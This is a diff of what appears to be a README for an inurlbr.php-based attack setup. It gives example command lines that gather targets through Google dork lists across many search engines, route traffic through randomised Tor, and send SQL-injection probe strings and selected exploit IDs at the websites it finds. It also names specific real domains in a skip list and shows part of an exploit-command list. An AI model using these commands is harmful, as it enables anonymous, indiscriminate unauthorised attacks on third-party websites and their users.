@@ -10,16 +10,15 @@ The rest of the exploit scripts are included
 
 Example usage:
 
-./inurlbr.php  --dork 'inurl:.php?id=' --custom-config K00B404.conf -s maart2018.lst --tor-random  --mp 1 -q 1,2,3,4,5,6,7 --exploit-vul-id 1,2,3,5,15,4 --exploit-get "'0x27%27"  --custom-blacklist '.fleurlis.,.katun.,.alphaone.,.katun.me,.bible-history.'
+    ./inurlbr.php  --dork-file 'Dorks/dorks2017-prefixed.lst' --custom-config K00B404.conf -s maart2018.lst --tor-random  --mp 1 -q 3 --exploit-vul-id 1,2,3,5,15,11,14,9 --exploit-get "'0x27%27"  --custom-blacklist '.fleurlis.,.katun.,.alphaone.,.katun.me,.bible-history.,.thornbridgebrewery.com,.angelsrescuingkritters.com,.bransonparksandrecreation.com,.slightergolf.com,.vacationet.com,eco3d'
 
 Using a dork list and 10 pages of every searchengine (23) do:
 
-./inurlbr.php  --dork-file 'Dorks/dorks2017-prefixed.lst' --custom-config K00B404.conf -s maart2018.lst --tor-random  --mp 10 -q all --exploit-vul-id 1,2,3,5,15 --exploit-get "'0x27%27"  --custom-blacklist '.fleurlis.,.katun.,.alphaone.,.katun.me,.bible-history.'
-
+    ./inurlbr.php  --dork-file 'Dorks/dorks2017-prefixed.lst' --custom-config K00B404.conf -s maart2018.lst --tor-random  --mp 10 -q all --exploit-vul-id 1,2,3,5,15 --exploit-get "'0x27%27"  --custom-blacklist '.fleurlis.,.katun.,.alphaone.,.katun.me,.bible-history.'
 
 for list of --exploit-vul-id options which you can add if you like
 
-./inurlbr.php --custom-config K00B404.conf --exploit-list
+    ./inurlbr.php --custom-config K00B404.conf --exploit-list
 
     [0] => TYPE::COMMAND
     [1] => MKDIR::service tor restart && mkdir -p output/_TARGET_
